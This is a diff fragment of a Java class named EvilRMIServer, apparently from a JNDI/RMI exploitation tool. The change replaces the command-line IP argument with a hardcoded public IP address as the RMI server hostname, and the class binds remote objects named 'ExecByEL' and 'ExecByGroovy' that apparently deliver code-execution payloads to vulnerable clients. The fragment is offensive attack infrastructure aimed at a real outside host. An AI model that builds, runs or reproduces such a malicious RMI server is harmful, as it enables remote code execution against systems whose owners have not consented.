@@ -58,10 +58,8 @@ public class EvilRMIServer {
 
         System.out.println("Creating evil RMI registry on port 8080");
         Registry registry = LocateRegistry.createRegistry(8080);
-        String ip = args[0];
-        System.out.println(ip);
-        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,7777));
-        System.setProperty("java.rmi.server.hostname",ip);
+        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener("",7777));
+        System.setProperty("java.rmi.server.hostname","182.92.151.151");
 
         registry.bind("ExecByEL",evilRMIServer.execByEL());
         registry.bind("ExecByGroovy",evilRMIServer.execByGroovy());
